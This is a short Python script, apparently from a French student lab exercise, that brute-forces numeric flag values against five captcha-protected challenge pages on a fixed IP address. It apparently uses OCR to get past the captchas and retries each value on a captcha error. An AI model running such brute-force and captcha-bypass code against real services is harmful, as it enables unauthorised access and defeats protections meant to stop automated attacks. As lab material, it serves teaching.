from src.tp3.utils.config import logger
from src.tp3.utils.session import Session


def main():
    logger.info("Démarrage du Brute-force (Mode : Captcha Dynamique)")
    ip = "31.220.95.27:9002"
    challenges = {str(i): f"http://{ip}/captcha{i}/" for i in range(1, 6)}
    ranges = {"1": (1000, 2000), "2": (2000, 3000), "3": (3000, 4000), "4": (4000, 5000), "5": (5000, 6000)}

    for i in challenges:
        url = challenges[i]
        session = Session(url)
        start, end = ranges[i]
        current_flag = start

        logger.info(f"--- Attaque du Challenge {i} ---")

        while current_flag <= end:
            session.flag_value = current_flag

            session.prepare_request()
            session.submit_request()
            response_text = session.response.text

            if session.process_response():
                logger.info(f"BRAVO ! Flag {i} trouvé : {session.get_flag()}")
                break

            if "Invalid captcha" in response_text:
                logger.warning(f"Erreur OCR sur flag {current_flag}. On recommence cet index.")
                continue

            current_flag += 1

            if current_flag % 20 == 0:
                logger.info(f"Progression Challenge {i} : {current_flag}/{end}")


if __name__ == "__main__":
    main()
